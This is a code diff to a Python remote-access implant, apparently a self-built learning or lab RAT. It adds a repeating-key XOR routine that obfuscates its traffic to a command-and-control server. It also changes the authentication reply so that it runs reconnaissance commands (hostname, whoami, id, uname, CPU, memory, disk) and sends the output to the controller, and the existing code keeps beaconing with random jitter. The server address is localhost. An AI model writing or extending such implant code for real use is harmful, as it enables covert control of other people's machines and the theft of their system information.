@@ -5,7 +5,6 @@ import subprocess
 import os 
 import hashlib
 import random
-import signal
 import sys
 
 
@@ -14,7 +13,7 @@ HEADER_FORMAT = '!B I'  					# B = MTYPE (1 byte); I = PAYLOAD LENGTH (4 bytes)
 HEADER_SIZE = struct.calcsize(HEADER_FORMAT) 	# CALCULATES AND RETURNS HEADER_SIZE IN BYTES
 C2_IP = '127.0.0.1'								
 C2_PORT = 1346
-KEY = 'placeholder'
+XOR_KEY = 'R@TT3NPR1NZ'
 
 # PROTOCOL MESSAGE TYPES
 MT_BEACON 	= 0
@@ -27,6 +26,21 @@ MT_DATA		= 6
 MT_ERR		= 7
 
 # HELPER FUNCTIONS
+
+def xor_crypt(payload: bytes, key: str = XOR_KEY) -> bytes:        # SYMMETRIC REPEATING KEY XOR FUNCTION - NB. THIS ONLY OBFUSCATES PAYLOAD
+
+    if not payload:                         # IF NO PAYLOAD THEN RETURN EMPTY BYTES OBJECT
+        return b''
+
+    if isinstance(payload, bytearray):      # NORMALIZE INPUT - BYTEARRAY -> BYTES
+        payload = bytes(payload)
+    elif not isinstance(payload, bytes):
+        raise TypeError("--- XOR_CRYPT ERROR: PAYLOAD MUST BE IN BYTES/BYTEARRAY ---")
+
+    key_bytes = key.encode('utf-8', errors='strict')
+    key_len = len(key_bytes)
+
+    return bytes(b ^ key_bytes[i % key_len] for i, b in enumerate(payload)) # APPLY REPEATING XOR CIPHER - NB. FAIRLY TRIVIAL TO BREAK CIPHER
 
 def beacon():
     time.sleep(random.uniform(0, random.randint(2,10)))			                      # JITTER
@@ -70,12 +84,14 @@ def recv_packet(s):
     else:
         payload = b''
     
-    return mtype, payload_length, payload
+    decrypted_payload = xor_crypt(payload)
+    return mtype, payload_length, decrypted_payload
 
 def send_data(s, mtype: int, payload: bytes) -> bool:
     try: 
-        header = struct.pack(HEADER_FORMAT, mtype, len(payload))
-        s.sendall(header + payload)
+        enc_payload = xor_crypt(payload)
+        header = struct.pack(HEADER_FORMAT, mtype, len(enc_payload))
+        s.sendall(header + enc_payload)
         return True
     except Exception as e:
         print(e)
@@ -98,9 +114,9 @@ def init():
                 # RECEIVE AUTH_REQ
                 response = recv_packet(s)
                 
-                # SEND AUTH_OK RESPONSE
+                # SEND AUTH_OK RESPONSE AND LOCAL SYSINFO
                 if response[0] == MT_AUTH:
-                    send_data(s, MT_AUTH, b'')
+                    send_data(s, MT_AUTH, run_cmd('hostname; whoami; uptime; pwd; id; uname -a; cat /proc/cpuinfo | grep "model name" | head -1; free -h | grep -E "Mem|Swap"; df -h | head -4'.encode('utf-8', errors='replace')))
                     print('sent MT_AUTH response packet')
             
                     return s   # return socket
